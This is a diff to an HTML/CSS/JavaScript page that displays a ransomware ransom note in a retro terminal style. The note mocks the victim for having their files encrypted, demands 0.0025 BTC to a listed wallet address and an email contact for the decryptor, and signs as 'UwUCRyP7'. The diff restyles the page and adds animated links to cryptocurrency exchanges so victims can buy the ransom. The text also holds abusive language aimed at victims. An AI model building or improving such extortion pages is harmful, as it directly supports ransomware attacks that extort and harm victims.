@@ -32,13 +32,14 @@
             position: relative;
             z-index: 1;
             text-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
+            overflow-y: auto;
         }
 
         /* Scanlines */
         .crt-container::before {
             content: " ";
             display: block;
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             bottom: 0;
@@ -53,7 +54,7 @@
         .crt-container::after {
             content: " ";
             display: block;
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             bottom: 0;
@@ -73,6 +74,25 @@
             position: relative;
             z-index: 3;
             word-wrap: break-word;
+        }
+
+        .terminal-text a {
+            color: var(--terminal-green);
+            text-decoration: underline;
+            text-shadow: 0 0 5px rgba(57, 255, 20, 0.5);
+        }
+
+        .terminal-text a:hover {
+            color: #fff;
+            background-color: var(--terminal-green);
+            text-shadow: none;
+        }
+
+        .links-container {
+            margin-top: 2rem;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
         @media (max-width: 600px) {
@@ -101,11 +121,6 @@
             50% { opacity: 0.05; }
             100% { opacity: 0.02; }
         }
-
-        .red-text {
-            color: #ff3333;
-            text-shadow: 0 0 5px rgba(255, 51, 51, 0.5);
-        }
     </style>
 </head>
 <body>
@@ -117,21 +132,27 @@
     </div>
 
     <script>
+        // Store the main text string
         const message = `Awwww, did ur shit get encrypted? poor baaby! maybe you'll learn a lesson here 
 
 PAY .0025 BTC TO bc1q2qa86a7j8yy3ktp4k3w6tmth7nkpt07mg5gwtl AND THEN EMAIL DECRYPT@DECRYPTMYSHIT.XYZ FOR DECRYPTOR AND KEY! 
 
 DON'T INSTALL RANDOM BULLSHIT NEXT TIME YOU STUPID FUCK!
 
-— U got pwnd by UwUCRyP7, GIT REKT BOZO
+— U got pwnd by UwUCRyP7, GIT REKT BOZO`;
 
-<p><a href="https://www.coinbase.com">Use Coinbase</a></p>
-<p><a href="https://www.kraken.com">Use Kraken</a></p>
-<p><a href="https://www.binance.us/buy">Use Binance</a></p>
-<p><a href="https://crypto.com">Use Crypto.com</a></p>
-<p><a href="https://coingate.com/buy">Use Coingate</a></p>
-<p><a href="https://www.moonpay.com">Use Moonpay</a></p>
-<p><a href="https://www.bitpay.com/buy-crypto">Use Bitpay</a></p>`;
+        // Store the HTML links separately so they don't break during character-by-character typing
+        const linksHTML = `
+            <div class="links-container">
+                <a href="https://www.coinbase.com" target="_blank">Use Coinbase</a>
+                <a href="https://www.kraken.com" target="_blank">Use Kraken</a>
+                <a href="https://www.binance.us/buy" target="_blank">Use Binance</a>
+                <a href="https://crypto.com" target="_blank">Use Crypto.com</a>
+                <a href="https://coingate.com/buy" target="_blank">Use Coingate</a>
+                <a href="https://www.moonpay.com" target="_blank">Use Moonpay</a>
+                <a href="https://www.bitpay.com/buy-crypto" target="_blank">Use Bitpay</a>
+            </div>
+        `;
         
         const outputElement = document.getElementById('typewriter-output');
         let index = 0;
@@ -157,6 +178,9 @@ DON'T INSTALL RANDOM BULLSHIT NEXT TIME YOU STUPID FUCK!
                 }
 
                 setTimeout(typeWriter, currentSpeed);
+            } else {
+                // Append the HTML links instantly once typing finishes
+                outputElement.innerHTML += linksHTML;
             }
         }
 
